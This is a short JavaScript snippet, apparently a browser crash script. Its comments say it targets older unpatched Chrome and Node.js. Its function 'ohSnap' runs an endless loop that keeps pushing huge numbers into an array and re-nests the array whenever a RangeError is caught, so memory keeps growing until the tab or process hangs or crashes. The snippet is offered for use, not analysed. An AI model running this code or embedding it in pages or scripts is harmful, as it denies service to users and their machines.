// this version is the slower than the original
// for older unpatched version of Chrome/NodeJS, or anything that doesn't use v8 rendering engine
// USE THE ORIGINAL
function ohSnap() {
    var old = null;
    var corruptable=[];
	var i = 1;
	while(true) {
		i += 99999999999*i*i+Math.pow(i,i);
		try {
			corruptable.push(Math.pow(i,i));
		} catch(error) {
			if(error.name === 'RangeError') {
				// chrome is being stupid
				old = corruptable;
				corruptable = [];
				corruptable.push(old);
			}
		}
	}
}
